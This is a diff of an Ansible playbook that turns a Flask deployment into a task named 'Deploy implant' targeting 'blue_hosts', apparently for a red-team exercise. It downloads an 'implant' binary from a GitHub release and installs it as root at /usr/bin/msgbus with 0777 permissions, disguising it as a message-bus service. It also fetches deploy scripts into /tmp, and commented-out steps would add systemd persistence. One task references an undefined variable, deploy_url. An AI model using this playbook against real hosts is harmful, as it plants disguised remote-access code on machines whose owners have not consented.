@@ -1,20 +1,42 @@
 ---
 # Deployment on the flask host - sitting behind the firewall
-- name: Install and Deploy Flask
-  hosts: beanjump_host
+- name: Deploy implant
+  hosts: blue_hosts
   vars:
-    repository_url: https://github.com/vaughnw128/beanjump.git
-    repository_path: ./beanjump
-  remote_user: ansiblectl
+    implant_url: "https://github.com/vaughnw128/shelly/releases/download/v0.0.6/implant"
+    release_url: "https://github.com/vaughnw128/shelly/archive/refs/tags/v0.0.6.zip"
+  remote_user: ansible
   become: yes
+  sudo: yes
   tasks:
-    # Takes the beanjump.service and adds it to systemd
-    - name: template systemd service config
-      copy:
-        src: msgbus.service
-        dest: /etc/systemd/system/msgbus.service
-      become: yes
-    # Starts the systemd service for beanjump
-    - name: start systemd app service
-      systemd: name=msgbus.service state=restarted enabled=yes
-      become: yes
+
+    - name: download implant
+      ansible.builtin.get_url:
+        url: "{{ implant_url }}"
+        dest: "/usr/bin/msgbus"
+        mode: '0777'
+        owner: root
+      
+    - name: download deploy scripts
+      ansible.builtin.get_url:
+        url: "{{ deploy_url }}"
+        dest: "/tmp/shelly"
+        mode: '0777'
+        owner: root
+        
+    # - name: unarchive deploy scripts
+    #   unarchive:
+    #     src: "/tmp/deploy.zip"
+    #     dest: "/tmp"
+    #     mode: 0755
+
+    # - name: Copy systemd job to systemd 
+    #   copy: remote_src=True src=/tmp/msgbus.service dest=/etc/systemd/system/msgbus.service
+
+    # - name: Execute the deploy script
+    #   command: sh /tmp/deploy.sh
+
+    # # Starts the systemd service for msgbus
+    # - name: start systemd app service
+    #   systemd: name=msgbus.service state=restarted enabled=yes
+    #   become: yes
